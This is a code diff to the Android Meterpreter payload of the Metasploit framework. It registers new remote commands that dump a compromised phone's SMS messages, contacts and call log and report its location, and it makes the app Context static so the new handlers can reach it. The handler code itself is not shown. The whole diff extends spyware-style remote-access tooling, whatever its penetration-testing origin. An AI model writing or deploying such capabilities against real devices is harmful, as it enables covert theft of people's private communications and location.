@@ -5,6 +5,10 @@ import java.io.OutputStream;
 
 import android.content.Context;
 
+import com.metasploit.meterpreter.android.dump_calllog_android;
+import com.metasploit.meterpreter.android.dump_contacts_android;
+import com.metasploit.meterpreter.android.dump_sms_android;
+import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
 import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
 import com.metasploit.meterpreter.android.webcam_audio_record_android;
@@ -37,15 +41,15 @@ import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;
 
 public class AndroidMeterpreter extends Meterpreter {
 
-    private final Context context;
+    private static Context context;
 
-    public Context getContext() {
+    public static Context getContext() {
         return context;
     }
 
     public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Context context, boolean redirectErrors) throws Exception {
         super(in, rawOut, true, redirectErrors, false);
-        this.context = context;
+        AndroidMeterpreter.context = context;
         startExecuting();
     }
 
@@ -82,6 +86,11 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("webcam_start", webcam_start_android.class);
         mgr.registerCommand("webcam_stop", webcam_stop_android.class);
         mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
+        
+        mgr.registerCommand("dump_sms", dump_sms_android.class);
+        mgr.registerCommand("dump_contacts", dump_contacts_android.class);
+        mgr.registerCommand("geolocate", geolocate_android.class);
+        mgr.registerCommand("dump_calllog", dump_calllog_android.class);
         return getCommandManager().getNewCommands();
     }
 }
